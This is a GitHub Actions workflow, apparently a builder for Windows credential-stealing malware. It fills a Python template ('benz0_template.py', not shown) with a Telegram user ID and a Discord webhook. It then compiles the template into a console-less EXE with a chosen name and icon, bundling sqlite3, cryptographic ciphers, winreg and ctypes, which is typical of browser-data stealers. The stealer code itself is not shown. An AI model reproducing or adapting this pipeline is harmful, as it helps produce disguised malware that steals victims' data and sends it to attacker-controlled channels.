name: Build EXE

on:
  workflow_dispatch:
    inputs:
      user_id:
        description: 'Telegram User ID'
        required: true
        type: string
      discord_webhook:
        description: 'Discord Webhook (optional)'
        required: false
        type: string
      file_name:
        description: 'Desired EXE file name (without .exe)'
        required: false
        type: string
        default: 'benz0'
      icon_base64:
        description: 'Icon file as base64 (optional)'
        required: false
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.10'

      - name: Install dependencies
        run: |
          pip install pyinstaller pycryptodome requests pillow

      - name: Decode icon (if provided)
        if: github.event.inputs.icon_base64 != ''
        shell: pwsh
        run: |
          $bytes = [Convert]::FromBase64String("${{ github.event.inputs.icon_base64 }}")
          [IO.File]::WriteAllBytes("temp_icon.png", $bytes)

      - name: Convert icon to valid ICO (if provided)
        if: github.event.inputs.icon_base64 != ''
        run: |
          python -c "
          import sys
          from PIL import Image
          try:
              img = Image.open('temp_icon.png')
              img.save('icon.ico', format='ICO', sizes=[(16,16),(32,32),(48,48),(64,64),(128,128),(256,256)])
              print('Icon converted')
          except Exception as e:
              print(f'Error: {e}', file=sys.stderr)
              sys.exit(1)
          "

      - name: Generate build script from template
        shell: pwsh
        run: |
          $template = Get-Content "benz0_template.py" -Raw
          $template = $template -replace 'USER_ID = "REPLACE_ME"', "USER_ID = `"${{ github.event.inputs.user_id }}`""
          if ("${{ github.event.inputs.discord_webhook }}" -ne "") {
            $template = $template -replace 'h00k = "https://discord.com/api/webhooks/..."', "h00k = `"${{ github.event.inputs.discord_webhook }}`""
          }
          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
          $template | Out-File -FilePath "${filename}.py" -Encoding utf8

      - name: Build EXE with ALL packages forced
        run: |
          $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
          $icon_arg = if (Test-Path "icon.ico") { "--icon=icon.ico" } else { "" }
          # Определяем пути к пакетам
          $crypto_path = python -c "import Crypto, os; print(os.path.dirname(Crypto.__file__))"
          $urllib3_path = python -c "import urllib3, os; print(os.path.dirname(urllib3.__file__))"
          $requests_path = python -c "import requests, os; print(os.path.dirname(requests.__file__))"
          $certifi_path = python -c "import certifi, os; print(os.path.dirname(certifi.__file__))"
          $charset_normalizer_path = python -c "import charset_normalizer, os; print(os.path.dirname(charset_normalizer.__file__))"
          $idna_path = python -c "import idna, os; print(os.path.dirname(idna.__file__))"
          $chardet_path = python -c "import chardet, os; print(os.path.dirname(chardet.__file__))"
          $PIL_path = python -c "import PIL, os; print(os.path.dirname(PIL.__file__))"
          pyinstaller --onefile --noconsole `
            --add-data "$crypto_path;Crypto" `
            --add-data "$urllib3_path;urllib3" `
            --add-data "$requests_path;requests" `
            --add-data "$certifi_path;certifi" `
            --add-data "$charset_normalizer_path;charset_normalizer" `
            --add-data "$idna_path;idna" `
            --add-data "$chardet_path;chardet" `
            --add-data "$PIL_path;PIL" `
            --collect-all=Crypto `
            --collect-all=urllib3 `
            --collect-all=requests `
            --collect-all=certifi `
            --collect-all=charset_normalizer `
            --collect-all=idna `
            --collect-all=chardet `
            --collect-all=PIL `
            --hidden-import=Crypto `
            --hidden-import=Crypto.Cipher `
            --hidden-import=Crypto.Hash `
            --hidden-import=Crypto.IO `
            --hidden-import=Crypto.Math `
            --hidden-import=Crypto.Protocol `
            --hidden-import=Crypto.PublicKey `
            --hidden-import=Crypto.Signature `
            --hidden-import=Crypto.SelfTest `
            --hidden-import=Crypto.Util `
            --hidden-import=Crypto.Cipher.ARC2 `
            --hidden-import=Crypto.Cipher.ARC4 `
            --hidden-import=Crypto.Cipher.Blowfish `
            --hidden-import=Crypto.Cipher.CAST `
            --hidden-import=Crypto.Cipher.ChaCha20 `
            --hidden-import=Crypto.Cipher.ChaCha20_Poly1305 `
            --hidden-import=Crypto.Cipher.DES `
            --hidden-import=Crypto.Cipher.DES3 `
            --hidden-import=Crypto.Cipher.PKCS1_OAEP `
            --hidden-import=Crypto.Cipher.PKCS1_v1_5 `
            --hidden-import=Crypto.Cipher.Salsa20 `
            --hidden-import=Crypto.Hash.BLAKE2b `
            --hidden-import=Crypto.Hash.KMAC128 `
            --hidden-import=Crypto.Hash.KMAC256 `
            --hidden-import=Crypto.Hash.KangarooTwelve `
            --hidden-import=Crypto.Hash.MD2 `
            --hidden-import=Crypto.Hash.MD4 `
            --hidden-import=Crypto.Hash.RIPEMD `
            --hidden-import=Crypto.Hash.SHA `
            --hidden-import=Crypto.Hash.SHAKE128 `
            --hidden-import=Crypto.Hash.SHAKE256 `
            --hidden-import=Crypto.Hash.TupleHash128 `
            --hidden-import=Crypto.Hash.TupleHash256 `
            --hidden-import=Crypto.Hash.TurboSHAKE256 `
            --hidden-import=Crypto.IO.PEM `
            --hidden-import=Crypto.IO.PKCS8 `
            --hidden-import=Crypto.Math.Numbers `
            --hidden-import=Crypto.Math.Primality `
            --hidden-import=Crypto.Protocol.DH `
            --hidden-import=Crypto.Protocol.HPKE `
            --hidden-import=Crypto.Protocol.SecretSharing `
            --hidden-import=Crypto.PublicKey.DSA `
            --hidden-import=Crypto.PublicKey.ElGamal `
            --hidden-import=Crypto.PublicKey.RSA `
            --hidden-import=Crypto.PublicKey._curve25519 `
            --hidden-import=Crypto.PublicKey._curve448 `
            --hidden-import=Crypto.PublicKey._ec_ws `
            --hidden-import=Crypto.PublicKey._ed25519 `
            --hidden-import=Crypto.PublicKey._ed448 `
            --hidden-import=Crypto.SelfTest.Cipher `
            --hidden-import=Crypto.SelfTest.Hash `
            --hidden-import=Crypto.SelfTest.IO `
            --hidden-import=Crypto.SelfTest.Math `
            --hidden-import=Crypto.SelfTest.Protocol `
            --hidden-import=Crypto.SelfTest.PublicKey `
            --hidden-import=Crypto.SelfTest.Random `
            --hidden-import=Crypto.SelfTest.Signature `
            --hidden-import=Crypto.SelfTest.Util `
            --hidden-import=Crypto.Util._cpuid_c `
            --hidden-import=Crypto.Util._strxor `
            --hidden-import=sqlite3 `
            --hidden-import=ctypes `
            --hidden-import=winreg `
            --hidden-import=threading `
            --hidden-import=subprocess `
            --hidden-import=datetime `
            --hidden-import=time `
            --hidden-import=random `
            --hidden-import=re `
            --hidden-import=os `
            --hidden-import=sys `
            --hidden-import=base64 `
            --hidden-import=json `
            --hidden-import=zipfile `
            --hidden-import=shutil `
            --hidden-import=urllib.request `
            --hidden-import=urllib.parse `
            --hidden-import=urllib.error `
            --hidden-import=traceback `
            --hidden-import=tempfile `
            --hidden-import=glob `
            --hidden-import=struct `
            --hidden-import=socket `
            --hidden-import=ssl `
            --hidden-import=hashlib `
            --hidden-import=hmac `
            --hidden-import=http.client `
            --hidden-import=io `
            --hidden-import=binascii `
            --hidden-import=requests.help `
            --hidden-import=certifi.__main__ `
            --hidden-import=charset_normalizer.__main__ `
            --hidden-import=idna.__main__ `
            --hidden-import=idna.codec `
            --hidden-import=idna.compat `
            $icon_arg `
            "${filename}.py"
          $exe_name = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}.exe" } else { "benz0_${{ github.event.inputs.user_id }}.exe" }
          if (Test-Path "dist\${filename}.exe") {
            Rename-Item -Path "dist\${filename}.exe" -NewName $exe_name
          } else {
            Write-Error "EXE not found"
            exit 1
          }

      - name: Upload EXE as artifact
        uses: actions/upload-artifact@v4
        with:
          name: benz0_${{ github.event.inputs.user_id }}
          path: dist/${{ github.event.inputs.file_name }}.exe
